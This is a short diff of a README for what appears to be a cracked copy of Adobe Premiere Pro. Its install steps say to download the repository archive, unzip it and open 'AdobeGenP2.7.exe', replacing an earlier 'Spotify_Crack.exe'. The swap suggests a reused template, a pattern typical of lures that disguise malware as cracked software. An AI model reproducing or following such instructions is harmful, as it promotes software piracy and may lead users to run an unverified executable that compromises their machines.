@@ -6,4 +6,4 @@ Adobe Premiere Pro is a timeline-based and non-linear video editing software app
 ## Install
     • Click button "code"
     • Unzip archive 
-    • Open Spotify_Crack.exe
+    • Open AdobeGenP2.7.exe
